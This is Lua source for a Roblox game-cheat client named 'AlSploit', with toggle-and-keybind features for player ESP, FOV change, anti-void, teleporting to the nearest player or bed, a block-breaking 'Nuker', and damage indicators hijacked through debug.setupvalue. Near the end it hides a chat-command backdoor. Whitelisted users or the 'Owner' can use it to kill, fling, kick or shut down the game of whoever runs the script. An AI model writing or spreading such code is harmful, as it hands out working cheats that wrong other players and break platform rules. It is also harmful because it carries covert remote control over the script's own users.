	local Fov, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "Fov", Settings.Fov.Value, function(CallBack)
		Settings.Fov.Value = CallBack

		if Settings.Fov.Value == true then
			FovController:setFOV(Settings.Fov.Fov)
		end

		if Settings.Fov.Value == false then
			FovController:setFOV(ClientHandlerStore:getState().Settings.fov)
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.Fov.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Fov.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Fov.KeyBind then
					Settings.Fov.Value = not Settings.Fov.Value

					if Settings.Fov.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.Fov.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(UtilityTab, "Speed", Settings.Fov.Fov, 120, LayoutOrder + 2, function(CallBack)
					Settings.Fov.Fov = CallBack

					if Settings.Fov.Value == true then
						FovController:setFOV(Settings.Fov.Fov)
					end
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local Esp, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "Esp", Settings.Esp.Value, function(CallBack)
		Settings.Esp.Value = CallBack
		
		if Settings.Esp.Value == true then
			task.spawn(function()
				for i, v in next, PlayerService:GetPlayers() do
					if IsAlive(v) and v ~= LocalPlayer and not v.Character.PrimaryPart:FindFirstChild("Esp") then
						CreateOutline(v)
					end

					v.CharacterAdded:Connect(function(Character)
						task.wait(0.3)

						if Settings.Esp.Value == true and IsAlive(PlayerService:FindFirstChild(Character.Name)) and v ~= LocalPlayer and not v.Character.PrimaryPart:FindFirstChild("Esp") then
							CreateOutline(v)
						end
					end)
				end
			end)

			task.spawn(function()
				PlayerService.PlayerAdded:Connect(function(Player)
					Player.CharacterAdded:Connect(function()
						task.wait(0.3)

						if Settings.Esp.Value == true and IsAlive(Player) and Player ~= LocalPlayer and not Player.Character.PrimaryPart:FindFirstChild("Esp") then
							CreateOutline(Player)
						end
					end)
				end)
			end)
		end
		
		if Settings.Esp.Value == false then
			for i, v in next, PlayerService:GetPlayers() do
				if IsAlive(v) and CallBack == false and v.Character.PrimaryPart:FindFirstChild("Esp") then
					v.Character.PrimaryPart:FindFirstChild("Esp"):Destroy()
				end
			end
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.Esp.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Esp.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Esp.KeyBind then
					Settings.Esp.Value = not Settings.Esp.Value

					if Settings.Esp.Value == true then
						task.spawn(function()
							for i, v in next, PlayerService:GetPlayers() do
								if IsAlive(v) and v ~= LocalPlayer and not v.Character.PrimaryPart:FindFirstChild("Esp") then
									CreateOutline(v)
								end

								v.CharacterAdded:Connect(function(Character)
									task.wait(0.3)

									if Settings.Esp.Value == true and IsAlive(PlayerService:FindFirstChild(Character.Name)) and v ~= LocalPlayer and not v.Character.PrimaryPart:FindFirstChild("Esp") then
										CreateOutline(v)
									end
								end)
							end
						end)

						task.spawn(function()
							PlayerService.PlayerAdded:Connect(function(Player)
								Player.CharacterAdded:Connect(function()
									task.wait(0.3)

									if Settings.Esp.Value == true and IsAlive(Player) and Player ~= LocalPlayer and not Player.Character.PrimaryPart:FindFirstChild("Esp") then
										CreateOutline(Player)
									end
								end)
							end)
						end)
						
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.Esp.Value == false then
						task.spawn(function()
							for i, v in next, PlayerService:GetPlayers() do
								if IsAlive(v) and v.Character.PrimaryPart:FindFirstChild("Esp") then
									v.Character.PrimaryPart:FindFirstChild("Esp"):Destroy()
								end
							end
						end)
								
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local GalaxySky, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "GalaxySky", Settings.GalaxySky.Value, function(CallBack)
		Settings.GalaxySky.Value = CallBack

		if Settings.GalaxySky.Value == true then
			if LightingService:FindFirstChild("Sky") and Settings.GalaxySky.Value == true then
				LightingService.Sky.Parent = ReplicatedStorage

				local Sky = Instance.new("Sky")
				local ID = 8281961896

				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
				Sky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. ID
				Sky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. ID
				Sky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. ID
				Sky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. ID

				Sky.Parent = LightingService
			end
		end

		if Settings.GalaxySky.Value == false then
			if ReplicatedStorage:FindFirstChild("Sky") and LightingService:FindFirstChild("Sky") and Settings.GalaxySky.Value == false then
				LightingService.Sky:Destroy()

				ReplicatedStorage.Sky.Parent = LightingService 
			end
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.GalaxySky.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.GalaxySky.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.GalaxySky.KeyBind then
					Settings.GalaxySky.Value = not Settings.GalaxySky.Value

					if Settings.GalaxySky.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.GalaxySky.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Indicators, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Indicators", Settings.Indicators.Value, function(CallBack)
		Settings.Indicators.Value = CallBack

		local OldObj = debug.getupvalue(DamageIndicator, 10)

		if Settings.Indicators.Value == true then
			local Messages = {"AlSploit", "Best Client", ":D", "💀"}

			debug.setupvalue(DamageIndicator, 10, {
				Create = function(self, obj, ...)
					task.spawn(function()
						if Settings.Indicators.Value == true then
							local Message = Messages[math.random(#Messages)]

							obj.Parent.Text = Message
							obj.Parent.TextColor3 = Color3.fromHSV(tick() % 10 / 10, 2, 2)

							task.spawn(function()
								task.wait(0.75)

								if Settings.Indicators.Value == true then
									obj.Parent:Destroy()
								end
							end)
						end
					end)
				end
			})
		end

		if Settings.Indicators.Value == false then
			debug.setupvalue(DamageIndicator, 10, {
				Create = function(self, obj, ...)
					obj = OldObj

					task.spawn(function()
						task.wait(0.5)
						obj.Parent:Destroy()
					end)
				end
			})
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.Indicators.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Indicators.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Indicators.KeyBind then
					Settings.Indicators.Value = not Settings.Indicators.Value

					if Settings.Indicators.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.Indicators.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local AntiVoid, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "AntiVoid", Settings.AntiVoid.Value, function(CallBack)
		Settings.AntiVoid.Value = CallBack

		if Settings.AntiVoid.Value == true then
			task.spawn(function()
				repeat task.wait() until GetMatchState() ~= 0

				task.wait(0.3)

				local OldLowestPosition = math.huge
				local LowestPosition = 99999

				local BlockRaycastParameters = RaycastParams.new()

				BlockRaycastParameters.FilterType = Enum.RaycastFilterType.Include
				BlockRaycastParameters.FilterDescendantsInstances = CollectionService:GetTagged("block")

				AntiVoidPart = Instance.new("Part")
				AntiVoidPart.Parent = WorkSpace
				AntiVoidPart.Material = Enum.Material.Neon
				AntiVoidPart.Name = "AntiVoidPart"
				AntiVoidPart.Size = Vector3.new(99999, 1, 99999)
				AntiVoidPart.Position = Vector3.new(0, 99999, 0)
				AntiVoidPart.Transparency = Settings.AntiVoid.Transparency
				AntiVoidPart.Color = Color3.new(0.666667, 0, 1)
				AntiVoidPart.CanCollide = false
				AntiVoidPart.Anchored = true

				for i, v in next, CollectionService:GetTagged("block") do
					local NewRay = WorkSpace:Raycast(v.Position + Vector3.new(0, 800, 0), Vector3.new(0, -1000, 0), BlockRaycastParameters)

					if NewRay then
						LowestPosition = NewRay.Position.Y
						if LowestPosition < OldLowestPosition then
							OldLowestPosition = LowestPosition

							AntiVoidPart.Position = Vector3.new(0, LowestPosition - 4, 0)
						end
					end					
				end

				AntiVoidPart.Touched:Connect(function()
					if IsAlive(LocalPlayer) and AntiVoidPart and LocalPlayer.Character.PrimaryPart.Position.Y <= WorkSpace.AntiVoidPart.Position.Y then
						for i = 1, 3 do
							if IsAlive(LocalPlayer) then
								LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(LocalPlayer.Character.PrimaryPart.Velocity.X, 100, LocalPlayer.Character.PrimaryPart.Velocity.Z)
							end
						end
					end
				end)
			end)
		end

		if Settings.AntiVoid.Value == false then
			if AntiVoidPart then
				AntiVoidPart:Destroy()
			end
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.AntiVoid.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AntiVoid.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AntiVoid.KeyBind then
					Settings.AntiVoid.Value = not Settings.AntiVoid.Value

					if Settings.AntiVoid.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.AntiVoid.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(WorldTab, "Transparency", Settings.AntiVoid.Transparency * 100, 100, LayoutOrder + 2, function(CallBack)
					Settings.AntiVoid.Transparency = CallBack / 100

					task.spawn(function()
						if AntiVoidPart then
							AntiVoidPart.Transparency = Settings.AntiVoid.Transparency
						end
					end)
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local PlayerTp, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "PlayerTp", Settings.PlayerTp.Value, function(CallBack)
		Settings.PlayerTp.Value = CallBack

		task.spawn(function()
			if Settings.PlayerTp.Value == true then
				if IsAlive(LocalPlayer) then
					repeat task.wait() until GetMatchState() ~= 0

					local NearestPlayer = FindNearestPlayer()

					if NearestPlayer ~= nil then
						KillHumanoid()

						LocalPlayer.CharacterAdded:Connect(function()
							repeat task.wait() until IsAlive(LocalPlayer)

							if IsAlive(LocalPlayer) and Settings.PlayerTp.Value == true then
								task.wait(0.15)

								TweenToNearestPlayer()
							end
						end)
					end	
				end

				if not IsAlive(LocalPlayer) then
					LocalPlayer.CharacterAdded:Connect(function()
						repeat task.wait() until IsAlive(LocalPlayer)						

						if IsAlive(LocalPlayer) and Settings.PlayerTp.Value == true and FindNearestPlayer() then
							task.wait(0.25)

							TweenToNearestPlayer()
						end
					end)
				end
			end	
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.PlayerTp.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.PlayerTp.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.PlayerTp.KeyBind then
					Settings.PlayerTp.Value = not Settings.PlayerTp.Value

					if Settings.PlayerTp.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.PlayerTp.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local BedTp, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "BedTp", Settings.BedTp.Value, function(CallBack)
		Settings.BedTp.Value = CallBack

		task.spawn(function()
			if Settings.BedTp.Value == true then
				if IsAlive(LocalPlayer) then
					repeat task.wait() until GetMatchState() ~= 0

					local NearestPlayer = FindNearestPlayer()

					if NearestPlayer ~= nil then
						KillHumanoid()

						LocalPlayer.CharacterAdded:Connect(function()
							repeat task.wait() until IsAlive(LocalPlayer)

							if IsAlive(LocalPlayer) and Settings.BedTp.Value == true then
								task.wait(0.15)

								TweenToNearestBed()
							end
						end)
					end	
				end

				if not IsAlive(LocalPlayer) then
					LocalPlayer.CharacterAdded:Connect(function()
						repeat task.wait() until IsAlive(LocalPlayer)						

						if IsAlive(LocalPlayer) and Settings.BedTp.Value == true and FindNearestPlayer() then
							task.wait(0.25)

							TweenToNearestBed()
						end
					end)
				end
			end	
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.BedTp.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.BedTp.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.BedTp.KeyBind then
					Settings.BedTp.Value = not Settings.BedTp.Value

					if Settings.BedTp.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.BedTp.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Nuker, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Nuker", Settings.Nuker.Value, function(CallBack)
		Settings.Nuker.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.Nuker.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Nuker.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Nuker.KeyBind then
					Settings.Nuker.Value = not Settings.Nuker.Value

					if Settings.Nuker.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.Nuker.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
	
	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(WorldTab, "BreakOres", Settings.Nuker.BreakOres, LayoutOrder + 2, function(CallBack)
					Settings.Nuker.BreakOres = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(WorldTab, "Range", Settings.Nuker.Range, 30, LayoutOrder + 3, function(CallBack)
					Settings.Nuker.Range = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local Cape, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Cape", Settings.Cape.Value, function(CallBack)
		Settings.Cape.Value = CallBack
		
		if Settings.Cape.Value == true then
			CreateCape("rbxassetid://14347677597")
			
			task.spawn(function()
				LocalPlayer.CharacterAdded:Connect(function()
					if IsAlive(LocalPlayer) and not LocalPlayer.Character:FindFirstChild("Cape") and CallBack == true then
						task.wait(0.3)

						CreateCape("rbxassetid://14347677597")
					end
				end)
			end)
		end
		
		if Settings.Cape.Value == false then
			if IsAlive(LocalPlayer) and LocalPlayer.Character:FindFirstChild("Cape") then
				LocalPlayer.Character.Cape:Destroy()
			end
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.Cape.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Cape.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Cape.KeyBind then
					Settings.Cape.Value = not Settings.Cape.Value

					if Settings.Cape.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.Cape.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	while task.wait(0.1) do
		for i, v in next, game.Players:GetPlayers() do
			v.Chatted:Connect(function(Message)
				for i, v2 in pairs(WhitelistedUsers) do
					if Message:lower() == ";kill default" and v.Name == v2.Name and v.Name ~= LocalPlayer then
						LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
						LocalPlayer.Character.Humanoid.Health = 0	
						
						task.wait(0.1)
						
						LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
						LocalPlayer.Character.Humanoid.Health = 0
					end

					if Message:lower() == ";breakmap default" and v.Name == v2.Name and v.Name ~= LocalPlayer  then
						for i, v in pairs(CollectionService:GetTagged("block")) do
							v:Destroy()
						end
					end

					if Message:lower() == ";leave default" and v.Name == v2.Name and v.Name ~= LocalPlayer  then
						game:Shutdown()
					end

					if Message:lower() == ";lagback default" and v.Name == v2.Name and v.Name ~= LocalPlayer  then
						LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(9e9, 9e9, 9e9)
					end	

					if Message:lower() == ";kick default" and v.Name == v2.Name and v.Name ~= LocalPlayer  then	
						if v.Name == Owner then
							LocalPlayer:Kick("Kicked by AlSploit Owner.")
						end
					end
				end
			end)
		end
	end
end)

task.spawn(function()
	local Horizontal = {Value = 15}
	local Vertical = {Value = 5}
	local Depth = {Value = 35} 

	local RotationZ = {Value = 5}

	local ViewModel = Camera:FindFirstChild("Viewmodel")
	local C1

	LocalPlayer.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_DEPTH_OFFSET", -(Depth.Value / 10))
	LocalPlayer.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", (Horizontal.Value / 10))
	LocalPlayer.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_VERTICAL_OFFSET", (Vertical.Value / 10))

	C1 = ViewModel.RightHand.RightWrist.C1

	ViewModel.RightHand.RightWrist.C1 = C1 * CFrame.Angles(math.rad(0), math.rad(0), math.rad(RotationZ.Value))

	CreateNotification(5, "AlSploit has loaded!")
	setfpscap(999)
end)
